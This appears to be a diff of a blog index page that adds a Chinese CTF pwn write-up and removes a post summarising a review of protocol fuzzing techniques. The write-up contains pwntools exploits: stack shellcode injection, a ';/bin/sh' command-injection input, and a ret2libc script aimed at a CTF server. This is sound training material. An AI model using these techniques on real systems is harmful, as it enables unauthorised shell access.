@@ -60,10 +60,10 @@
 			</ul>
 		</nav>
                                 <nav>
-                                               总文章数 39
+                                               总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">66k</span>
+	总字数 <span class="post-count">66.9k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -157,6 +157,124 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-buuctf-pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        <div align="center" class="post-count">
+    字数：626字 | 预计阅读时长：2分钟
+</div>
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/02/18/buuctf-pwn/">buuctf-pwn</a>
+    </h1>
+  
+
+        
+        <a href="/2024/02/18/buuctf-pwn/" class="archive-article-date">
+  	<time datetime="2024-02-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-02-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PWN刷题"><a href="#PWN刷题" class="headerlink" title="PWN刷题"></a>PWN刷题</h1><h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>运行一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mrctf2020_shellcode</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218104334527.png"></p>
+<p>执行程序发现，程序要求输入某个字符串。</p>
+<p>查看一下保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec mrctf2020_shellcode</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218104502746.png"></p>
+<p>1、程序架构是 amd64,64位，小端模式<br>2、got表只读不可写<br>3、没有启用栈保护<br>4、栈中数据有执行权限<br>5、启用位置无关可执行文件即编译时将程序编译为位置无关，程序运行时各个段加载的虚拟地址在装载时才确定<br>6、存在可读可写可执行段。</p>
+<p>使用ida pro 静态分析mrctf2020_shellcode程序</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218104916479.png"></p>
+<p>可以看到</p>
+<p>程序设置了410h的栈，使用_puts显示Show me your magic!之后，使用_read从标准输入读400h字符放入了rax，rax指向rbp+buf即栈中，然后输入串长度与0比较，大于0则跳转到loc_11D6即栈顶。也就是程序会从标准输入读取数据放入栈中，再跳转到栈中，并且从checksec可知栈是可执行的。那么直接把shellcode提供给程序输入即可。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218110338734.png"></p>
+<h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>运行看一下</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218161318705.png"></p>
+<p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218161407617.png"></p>
+<p>case1中存在system函数</p>
+<p><code>*(_QWORD *)dest = 0x20676E6970LL;</code></p>
+<p>dest的含义是ping ；当输入ip地址时就会执行ping命令，但在<code>system</code>执行函数时,加上<code>;</code>那么前后两个命令都会执行，所以我们拼接<code>strcat</code>中加上<code>;/bin/sh</code>就可以得到<code>shell</code>。</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218161635975.png"></p>
+<p>尝试一下，成功了</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_router&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218162133703.png"></p>
+<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p>查看保护</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218163325557.png"></p>
+<p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218163520617.png"></p>
+<ul>
+<li><code>32</code>位<code>libc</code>泄露</li>
+<li><code>ret2libc</code></li>
+</ul>
+<ol>
+<li>存在漏洞函数<code>vulnerable_function</code>变量<code>buf</code>存在溢出</li>
+<li>常规<code>32</code>位泄露<code>libc</code></li>
+</ol>
+<p>首先确定一下偏移量，gdb调试一下</p>
+<p><code>b *0x08048465</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218180822229.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218180902406.png"></p>
+<p>偏移量即136+4&#x3D;140</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./jar_level3&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./jar_level3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25210</span>)</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_plt) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys_addr) + p32(main_plt) + p32(bin_sh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload1泄露write函数的地址，以此计算libc库的基址，根据libc库的基址获取system和&#x2F;bin&#x2F;sh的地址，payload2执行shell。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/02/18/buuctf-pwn/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-CVE-2021-43474" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -1355,107 +1473,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2024/02/02/SeqGAN/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        <div align="center" class="post-count">
-    字数：2.4k字 | 预计阅读时长：8分钟
-</div>
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/">A Systematic Review of Network Protocol Fuzzing Techniques</a>
-    </h1>
-  
-
-        
-        <a href="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/" class="archive-article-date">
-  	<time datetime="2024-01-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques"><a href="#A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques" class="headerlink" title="A Systematic Review of Network Protocol Fuzzing Techniques"></a>A Systematic Review of Network Protocol Fuzzing Techniques</h1><p><strong>Published in:</strong> <a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/xpl/conhome/9481956/proceeding">2021 IEEE 4th Advanced Information Management, Communicates, Electronic and Automation Control Conference (IMCEC)</a></p>
-<p>本文详细介绍了网络协议模糊测试技术和机器学习技术在网络协议模糊测试中的应用研究进展。最后，总结了网络协议模糊测试技术存在的一些问题，并展望了未来的研究方向。</p>
-<p>网络协议模糊测试的基本原理是通过生成或突变来构造畸形数据包，然后通过套接字将畸形数据包发送给被测协议实体，并监控被测协议实体，以发现网络协议实现中的漏洞。模糊测试的关键是要遵守被测试协议实体的协议规范和状态机制，构建被测试协议实体可以接收和处理的畸形数据包。</p>
-<h2 id="网络协议模糊测试技术的分类"><a href="#网络协议模糊测试技术的分类" class="headerlink" title="网络协议模糊测试技术的分类"></a>网络协议模糊测试技术的分类</h2><p>基于生成的网络协议模糊测试主要分为预生成和自动生成两种类型。</p>
-<ol>
-<li>预生成方法需要分析协议实体使用的协议规范，了解字段支持的数据结构和字段接受的值范围，然后生成测试边界条件或违反规范的测试用例。自动生成方法需要研究协议实体的协议规范，然后创建描述协议规范的语法。通过这种方法，测试人员可以确定协议消息中禁止随意修改的静态字段和可以更改的动态字段，并生成在生成策略方面违反某些规范的测试用例。这种方法可以保证较高的接收率，但畸形程度较低。</li>
-<li>基于突变的网络协议模糊测试是捕获网络中正常的通信协议消息，根据突变策略将协议消息中的数据转换为非法值，生成畸形的测试用例，并对协议实体进行模糊测试。这种方法不是事先研究网络协议，而是拦截客户端和服务器之间通信中的网络流量，并根据突变策略以字节或协议特征为单位修改数据。这种方法节省了大量的人力，并且对测试人员的网络协议专业知识要求不高。但是，协议实体可能会拒绝接收具有非法值的测试用例，导致接收率较低，从而影响模糊测试的效率。</li>
-</ol>
-<h2 id="网络协议模糊测试的基本流程"><a href="#网络协议模糊测试的基本流程" class="headerlink" title="网络协议模糊测试的基本流程"></a>网络协议模糊测试的基本流程</h2><p><img src="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/image-20240131150858067.png"></p>
-<ol>
-<li>确定目标。为了选择合适的网络协议模糊测试工具或技术，我们需要充分了解并确定协议实体。</li>
-<li>识别输入。通常，大多数漏洞都是因为协议实体在接收外部输入时无法正确处理某些非法数据而被利用的。因此，考虑协议实体的所有可能输入对于网络协议模糊测试的成功具有重要意义。</li>
-<li>构造测试用例。构建测试用例是网络协议模糊测试过程中的关键步骤，测试用例生成方法决定了模糊测试的效率。通常，测试用例生成方法可以分为两类：基于生成的和基于突变的。在测试用例的构造中，可以采用其中一种方法或两种方法。</li>
-<li>监视执行并筛选异常。根据协议实体中测试用例的执行情况，观察协议实体是否行为异常或崩溃，并根据结果判断漏洞。</li>
-<li>确定可用性。根据不同的协议实体，进一步确定识别出的漏洞是否可以被利用。</li>
-</ol>
-<h2 id="网络协议模糊测试系统的基本结构"><a href="#网络协议模糊测试系统的基本结构" class="headerlink" title="网络协议模糊测试系统的基本结构"></a>网络协议模糊测试系统的基本结构</h2><p>网络协议模糊测试系统通常由四个模块组成：测试用例生成器、被测协议实体、异常监控器和异常分析器，如图所示</p>
-<p><img src="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/image-20240131151005560.png"></p>
-<ol>
-<li>测试用例生成器基本上是根据测试用例生成策略为被测试的协议实体生成测试用例，可分为基于生成的方法、基于突变的方法和两种方法的组合。如果采用基于生成的方法，则测试用例生成器会根据对被测协议实体的协议规范的分析来指导测试用例的生成。如果采用基于突变的方法，则测试用例生成器从有效消息开始，并使用不同的突变策略来帮助生成格式错误的消息。</li>
-<li>为了选择合适的网络协议模糊测试工具或技术，有必要指定被测试的协议实体，它可以是客户端、服务器或用于实现协议的任何软件。</li>
-<li>当被测试的协议实体在模糊测试过程中崩溃或出错时，异常监控器会收集相关的异常信息，帮助测试人员分析是否存在漏洞。</li>
-<li>异常分析主要包括异常的位置和原因。常用的方法是使用IDA Pro、OllyDbg等二元分析工具进行人工分析，因此是一项劳动密集型且耗时的工作。异常分析器可以自动分析漏洞的利用能力，大大提高了异常分析的效率。</li>
-</ol>
-<h2 id="应用于网络协议模糊测试的机器学习技术"><a href="#应用于网络协议模糊测试的机器学习技术" class="headerlink" title="应用于网络协议模糊测试的机器学习技术"></a>应用于网络协议模糊测试的机器学习技术</h2><p>针对协议规范和实现代码未知的问题，2017年，Rong Fan和Yaoyao Chang提出了一种自动生成专有网络协议测试用例的黑盒模糊测试方法。该方法使用 seq2seq 模型从通信流量中学习专有网络协议的输入模型，并自动生成协议消息以对协议实现执行模糊测试。</p>
-<p>2018年，胡志成等人开发了基于GAN的工业控制网络协议自动模糊框架GANFuzz。GANFuzz通过在生成对抗网络中训练生成的模型来学习协议语法，以估计工业控制网络协议消息的基本分布函数，并生成结构良好的测试用例。GANFuzz 在开放和专有的工业控制网络协议中都有很好的应用。但是，GANFuzz 不支持有状态网络协议。</p>
-<p>2019年，Hui Zhao等人开发了基于seq2seq模型的模糊测试框架SeqFuzzer 。SeqFuzzer 自动从通信流量中学习协议格式，并生成虚假但合理的消息作为测试用例。当EtherCAT报文格式未知时，SeqFuzzer可以自动生成接收率高的测试用例，并成功检测出多个安全漏洞。</p>
-<p>2019年，Zhihui Li等人提出了一种基于WGAN的工业控制网络协议测试用例自动生成方法。该方法可以学习真实数据帧的结构和分布，并在不知道详细协议规范的情况下生成相似的数据帧。</p>
-<p>2020年，Peiyuan Zong等提出了一种基于深度学习的FuzzGuard方法。FuzzGuard 可以在不执行目标程序的情况下预测输入的可访问性，因此有向灰盒模糊器 AFLGo 可以过滤掉无法到达的输入，提高模糊测试的效率。FuzzGuard 也适用于网络协议。</p>
-<h2 id="网络协议模糊测试技术存在的问题"><a href="#网络协议模糊测试技术存在的问题" class="headerlink" title="网络协议模糊测试技术存在的问题"></a>网络协议模糊测试技术存在的问题</h2><p>2002年，在网络协议模糊测试中首次引入协议格式，大大提高了测试用例的有效性和漏洞发现的效率。然而，这种模糊器在获取协议格式时依赖于手动分析，这导致网络协议模糊测试的自动化程度较低。</p>
-<p>基于突变的方法由于随机突变策略，无法保证测试用例的质量，因此被测试协议实体需要执行大量的测试用例来寻找有效的测试用例，这严重影响了有效测试用例的执行效率。</p>
-<p>基于生成的方法可以大大提高测试用例的有效性，但往往需要在前期投入大量时间来研究协议规范，这间接影响了有效测试用例的执行效率。</p>
-<p>在当前的模糊测试框架中，有状态网络协议的模糊测试方法很少。就模糊测试的基本原理而言，每个测试用例都是独立生成和执行的。这样的测试用例对于单状态网络协议模糊测试更有效。当用于有状态网络协议模糊测试时，它们无法帮助协议实体的状态转换。因此，有状态网络协议中只能覆盖部分代码，很难确保所有状态转换都经过测试。</p>
-<h2 id="网络协议模糊测试技术的未来研究方向"><a href="#网络协议模糊测试技术的未来研究方向" class="headerlink" title="网络协议模糊测试技术的未来研究方向"></a>网络协议模糊测试技术的未来研究方向</h2><h3 id="提高模糊测试的自动化程度"><a href="#提高模糊测试的自动化程度" class="headerlink" title="提高模糊测试的自动化程度"></a>提高模糊测试的自动化程度</h3><p>自动化和智能网络协议模糊测试技术的研究备受关注。一种解决方案是将生物学中的遗传算法应用于提高模糊测试的自动化程度。</p>
-<h3 id="优化测试用例过滤策略"><a href="#优化测试用例过滤策略" class="headerlink" title="优化测试用例过滤策略"></a>优化测试用例过滤策略</h3><p>将神经网络模型与网络协议模糊测试技术相结合，利用神经网络模型从海量数据中提取规则和知识，并自动过滤无效测试用例，从而提高模糊测试的效率。</p>
-<h3 id="有状态网络协议模糊测试方法的研究"><a href="#有状态网络协议模糊测试方法的研究" class="headerlink" title="有状态网络协议模糊测试方法的研究"></a>有状态网络协议模糊测试方法的研究</h3><p>基于网络协议状态遍历图构建测试用例序列，从而有效覆盖更多状态。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/">展开全文 >></a>
         </p>
       
 
